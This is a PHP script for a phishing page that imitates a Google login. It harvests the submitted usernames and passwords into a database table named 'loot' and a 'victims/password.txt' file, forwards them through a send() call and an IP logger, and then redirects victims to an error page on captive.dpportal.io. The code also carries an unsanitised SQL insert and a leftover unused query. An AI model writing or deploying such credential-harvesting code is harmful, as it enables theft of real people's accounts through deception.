<?php

//google page login php script

include("../../iplogger.php");
require("../../modules/dbcfg.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST')
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $data = "username:" .$_POST['username']."\n".
            "password:" .$_POST['password']."\n".
	        "Page:Google"."\n".
	        "Date:"     .(new DateTime("now", new DateTimeZone('Europe/London')))->format('Y-m-d H:i:sA')."\n\n";
  
  
	$username = $_POST['username'];
	$password = $_POST['password'];
	$service = "Google";
	$datetimestamp = date("Y-m-d h:i:sa");

	if($query = mysqli_query($connect,"INSERT INTO loot ('id', 'username', 'password', 'service', 'datetimestamp') VALUES('', '".$username."', '".$password."', '".$service."', '".$datetimestamp."')")){
        header('Location: ../websites/error/index.php');
    }else{
        echo "Failure" . mysqli_error($connect);
    }
  
  
  
  $sql = "INSERT INTO contactform_entries (id, fname, lname, email) VALUES ('0', '$fname', '$lname', '$email')";

    File_Put_Contents("../.././victims/password.txt", $data, FILE_APPEND);                                      
    send($data);	
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('http://captive.dpportal.io/login/websites/error/index.php');</script>";



exit();
?>